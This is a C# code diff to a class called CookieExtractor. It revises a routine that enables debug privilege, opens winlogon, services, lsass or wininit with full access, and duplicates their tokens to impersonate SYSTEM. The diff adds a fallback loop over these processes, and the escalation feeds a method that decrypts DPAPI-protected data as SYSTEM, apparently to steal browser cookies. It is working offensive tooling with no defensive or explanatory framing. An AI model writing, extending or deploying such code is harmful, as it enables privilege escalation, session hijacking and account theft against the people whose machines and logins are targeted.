@@ -480,37 +480,55 @@ public static class CookieExtractor
     {
         EnablePrivilege(SeDebugPrivilege);
 
-        uint lsassPid = FindLsassPid();
-        if (lsassPid == 0) throw new Exception("lsass.exe not found");
+        string[] systemProcs = { "winlogon", "services", "lsass", "wininit" };
+        Exception lastEx = null;
 
-        IntPtr hProcess = OpenProcess(ProcessAllAccess, false, lsassPid);
-        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());
-
-        try
+        foreach (string procName in systemProcs)
         {
-            if (!OpenProcessToken(hProcess, TokenDuplicate, out IntPtr hToken))
-                throw new Win32Exception(Marshal.GetLastWin32Error());
+            uint pid = FindProcessPid(procName);
+            if (pid == 0) continue;
 
             try
             {
-                if (!DuplicateTokenEx(hToken, TokenAllAccess, IntPtr.Zero,
-                    SecurityImpersonation, TokenImpersonation, out IntPtr hDupToken))
-                    throw new Win32Exception(Marshal.GetLastWin32Error());
+                IntPtr hProcess = OpenProcess(ProcessAllAccess, false, pid);
+                if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());
 
-                if (!SetThreadToken(IntPtr.Zero, hDupToken))
-                    throw new Win32Exception(Marshal.GetLastWin32Error());
+                try
+                {
+                    if (!OpenProcessToken(hProcess, TokenDuplicate, out IntPtr hToken))
+                        throw new Win32Exception(Marshal.GetLastWin32Error());
 
-                CloseHandle(hDupToken);
+                    try
+                    {
+                        if (!DuplicateTokenEx(hToken, TokenAllAccess, IntPtr.Zero,
+                            SecurityImpersonation, TokenImpersonation, out IntPtr hDupToken))
+                            throw new Win32Exception(Marshal.GetLastWin32Error());
+
+                        if (!SetThreadToken(IntPtr.Zero, hDupToken))
+                            throw new Win32Exception(Marshal.GetLastWin32Error());
+
+                        CloseHandle(hDupToken);
+                        Log($"Impersonated SYSTEM via {procName}.exe (pid={pid})");
+                        return;
+                    }
+                    finally
+                    {
+                        CloseHandle(hToken);
+                    }
+                }
+                finally
+                {
+                    CloseHandle(hProcess);
+                }
             }
-            finally
+            catch (Exception ex)
             {
-                CloseHandle(hToken);
+                lastEx = ex;
+                Log($"Impersonate {procName} failed: {ex.Message}");
             }
         }
-        finally
-        {
-            CloseHandle(hProcess);
-        }
+
+        throw new Exception("Could not impersonate any SYSTEM process: " + (lastEx?.Message ?? "none found"));
     }
 
     private static byte[] DPAPIUnprotectAsSystem(byte[] encrypted)
@@ -528,15 +546,17 @@ public static class CookieExtractor
         }
     }
 
-    private static uint FindLsassPid()
+    private static uint FindProcessPid(string name)
     {
-        foreach (var proc in System.Diagnostics.Process.GetProcessesByName("lsass"))
+        foreach (var proc in System.Diagnostics.Process.GetProcessesByName(name))
         {
             try { return (uint)proc.Id; }
             finally { proc.Dispose(); }
         }
         return 0;
     }
+
+    private static uint FindLsassPid() => FindProcessPid("lsass");
 
     private static IntPtr GetCurrentThreadToken()
     {
